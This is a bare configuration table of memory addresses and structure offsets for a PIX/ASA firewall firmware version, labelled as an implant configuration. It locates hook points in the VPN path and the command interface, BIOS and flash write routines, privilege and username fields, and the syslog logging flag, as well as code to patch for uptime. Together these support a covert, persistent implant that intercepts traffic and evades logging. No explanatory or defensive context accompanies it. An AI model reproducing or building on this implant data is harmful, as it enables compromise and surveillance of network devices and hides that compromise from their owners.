; --- SECTION I ---
;
0x10070800            // pix version
0x546000              // address of implant configuration
0x0   0x009893c0      // allocb
0x1   0x009895a4      // freeb
0x2   0x00116370      // open
0x3   0x004f97a8      // ip_put
0x4   0x00116474      // close
0x5   0x00c8f2c8      // atoip
0x6   0x00c7be88      // memset
0x7   0x00c97d70      // memmove
0x8   0x0098909c      // malloc_call_calloc
0x9   0x00c84f40      // free
0xa   0x00c7d368      // printf
0xb   0x00000014      // interface offset in metaframe
0xc   0x00000010      // offset for vlan number in interface struct
0xd   0x0000005c      // metaframe offset in block structure
0xe   0x00000078      // interface semiphore in metaframe
0xf   0x00c97b90      // rand
0x15  0x00113878      // process_create
0x16  0x001146f8      // process_suspend
0x17  0x001151e4      // process_sleep_for
0x18  0x0079cfc8      // show_process
0x19  0x0000001c      // offset to security level in int_struct
0x1a  0x00ea6f70      // cur_t
0x1b  0x04      // channel offset in interface struct
0x1c  0x0c      // PUT offset in channel struct
0x1d  0x24      // offset to dest mac in arp structure
0x1e  0x00      // offset to next hop ip in route structure
0x1f  0x10      // size of route struct
0x20  0x004fd094      // calc_ip_cksum
0x21  0x004fe90c      // arp_loopkup
0x22  0x004fd63c      // set_block_hdr_mac_and_proto
0x23  0x0050f3e0      // get hardware interface
0x24  0x00b3e518      // get next hop
0x25  0x00b42a90      // get route
0x26  0x004fb9dc      // send_it
0x27  0x00500728      // arp_create
0x28  0x007e9fcc      // get_hw_iface_2
0x2a  0x3c      // pointer to ethernet frame
0x2b  0x34            // wptr structure offset
0x2c  0x1c            // inIfc (incoming interface) structure offset
0x2d  0x0067f3b1      // VPN hook address
0x2e  0x188      // offset from cur_t that contains the current context number
0x2f  0x00e4bb18      // pointer to channnel list
0x30  0x00d7c99c      // address of NIC database
0x31  0x00000014      // offset to vlan struct in metaframe (interface offset)
0x32  0x00000020      // offset to IP address in int_struct
0x33  0x00000018      // iface struct adjust from metaframe
0x34  0x00e3b8fc      // max number of interface cards
0x35  0x00ea6750      // internal_clock
0x36  0x007e8e54      // get_interface_mac
0x37  0x00000143      // offset to hardware interface number in interface struct
0x38  0x4c      // offset to ip in route structure
0x39  0x68      // offset to interface num in route structure
0x3a  0x41c      // offset to send channel in channel list
0x3b  0x00459280      // ifs_read; flash file read routine -- IFS: Read:
0x3c  0x00459338      // ifs_write; flash file write routine -- IFS: Write:
0x3d  0x00458cc0      // ifs_open; flash file open routine -- IFS: Opened: 
0x3e  0x00459180      // ifs_close; flash file close routine -- IFS: Close: 
0x3f  0x18        // offset in block to next IP fragment ptr 
0x40  0x00ec0728      // address of context list
;
; --- END OF SECTION I ---
;
:EOS:
;
; --- SECTION II ---
;
HookLocation        0x0067e4c6      // address of our hook point.  Used for PBD.
JmpLocation         0x0068164e      // address of our hook point.  Used for PBD.
InterfaceAddr       0x00d7c99c      // same as 0x30 above
InterfaceLeng       0x000001b8      // length of interface struct
IntSecurityOffset   0x1c      // security level field offset
IntNameOffset       0x188      // interface name field offset
IntNumOffset        0x143      // interface number field offset
IntVlanOffset       0x10      // same as 0xc above
IntIPOffset         0x20      // ip address offset in the interface struct
IntNetmaskOffset    0x24      // netmask in the iface struct
FlashClassAddr      0x00000000      // addr of flash structure (not used in 7.*)
CryptoDeviceAddr    0x00eabaf0      // addr of crypto structure
ArpTableAddrPtr     0x00d6edf4      // addr of first entry in ARP table
ArpTableLastPtr     0x00d6edfc      // addr of last entry in ARP table
NumInterfaces       0x00000000      // addr of pointer to number of interfaces (not used in 7.*)
IfaceStruct2        0x00000000      // addr of pointer to second smaller interface struct (not used in 7.*)
IfaceStruct2Len     0x00      // length of 2nd smaller interface struct used by arp cache (not used in 7.*)
BiosClassAddr       0x00eb8b38      // addr of the bios class structure
BiosWriteAddr1      0x003c3d64      // addr of the bios write function for one specific bios
BiosWriteAddr2      0x003c649c      // addr of the bios write function for one specific bios
BiosWriteAddr3      0x003c6bb0      // addr of the bios write function for one specific bios
BiosWriteAddr4      0x003c73cc      // addr of the bios write function for one specific bios
BiosWriteAddr5      0x00000000      // addr of the bios write function for one specific bios
BiosWriteOffset     0x00000020      // offset into the bios structure where write addr is located
FlashMkdirAddress   0x004599a0      // ifs_mkdir; make flash directory routine -- IFS: Mkdir
ASAFlashRmdirAddress   0x00765404   // ifs_rmdir; remove flash directory routine for the asa
PIXFlashRmdirAddress   0x003bf520      // ifs_rmdir; remove flash directory routine for the pix
ASAFlashRmfileAddress  0x007653ac      // ifs_rmfile; remove flash file routine for the asa
PIXFlashRmfileAddress  0x003bf3b0      // ifs_rmfile; remove flash file routine for the pix
FlashDirlistAddress 0x004594c8      // ifs_get_dir_entry; get the next file name from a directory listing
FlashGetSizeAddress 0x004589ac      // ifs_get_size; get the size of the provided open file
FlashChmodAddress   0x00459600      // ifs_chmod; change the permissions on a file
FlashMoveFileAddress 0x00459724     // ifs_rename; move a file
FlashGetFileInfoAddress 0x00459bd0  // ifs_get_file_info; returns a structure that contains information about a file, including its size
FlashGetSpaceAddress 0x0045af14     // ifs_get_space_info; returns used and free space in flash
FlashFileInfoSizeOffset 0x00000018  // The offset to the file size in the structure returned by ifs_get_file_info
GetPlatformStringAddr 0x00c80668  // The address of a function that returns the platform string 
ASARestatFlashFlagAddr 0x00eccb00 // The address of the flag that tells the OS on the ASA to re-stat the files in flash (causes used space to be updated)
AnnounceFunc        0x001162c0      // addr of the device announce function
DevIoctlOffset      0x00000070      // offset to the ioctl function in a device structure
CIStartFunc         0x00149138      // addr of the command interface start function -- telnet function
CommandListAddr     0x00d9a980      // addr of the command list -- first parameter of ci
DeviceListPtrAddr   0x00e006a0      // pointer to the first entry in the device table -- find in announce
DeviceNextPtrOffset 0x50            // offset into the device table entry which has pointer to next entry -- find in announce
StrcmpFuncAddr      0x00c8c6d8      // address of strcmp -- search for 'strcmp'
SyslogFlagPtrAddr   0x00f6b640      // pointer to the logging flag. -- search for 'Syslog logging:'
PGDGETValue         0x85b00002      // The value used for PGD_GET when calling the pager ioctl
PGDPUSHValue        0x85b00003      // The value used for PGD_PUSH when calling the pager ioctl
PGDSETValue         0x85b00000      // The value used for PGD_SET when calling the pager ioctl
StdChOffset         0x6c            // Offset into a thread struct containing the stdch pointer
StdErrOffset        0x70            // Offset into a thread struct containing the stderr pointer
PrivFlagOffset      0x0c            // offset into an environment struct containing the privilege level indicator
UnameOffset         0x14            // offset into an environment struct containing the username 
EnvPtrOffset        0x78            // offset into a thread struct containing the pointer to the environment struct  
SyslogOffset        0x00000938      // offset into the syslog structure where the logging level is stored
Open                0x00116370      // open
CLIHookAddress       0x00149600      // Address of hook into the command interface
WatchDogTimeout     0x00000000      // Address where the thread timeout value is stored 
UpTimeCounter       0x00ea6750      // Address of the up time counter
Get_uptime_secs_addr            0x00c7d368  // Address of the function that fetches the uptime
Modified_getuptime_code_addr    0x00156dcb  // Address to the next nearest 20 nops
Get_uptime_secs_call_instr_addr 0x001561e8  // Address of the location of the get_uptime_secs call instruction
AvailMemoryPtr      0x00ea7488      // Address of total available memory
;
; --- END OF SECTION II ---
;
:EOS:
;
